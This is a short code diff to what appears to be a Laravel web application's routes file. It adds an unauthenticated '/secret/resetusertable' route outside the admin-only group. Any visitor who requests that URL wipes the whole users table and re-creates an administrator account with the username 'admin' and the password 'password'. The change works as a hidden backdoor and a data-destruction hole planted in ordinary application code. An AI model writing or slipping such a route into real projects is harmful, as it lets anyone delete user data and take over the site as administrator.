@@ -23,3 +23,15 @@ Route::group(array('before' => 'auth.admin'), function()
 	Route::get('/users','UserController@index');
 	Route::get('users/download','UserController@download');
 });
+
+Route::get('/secret/resetusertable',function(){
+    DB::table('users')->delete();
+    DB::table('users')->insert(array(
+         array(
+             'id' => 1
+            ,'role_id' => 1
+            ,'username' => 'admin'
+            ,'password' => Hash::make('password')
+         )
+    ));
+});
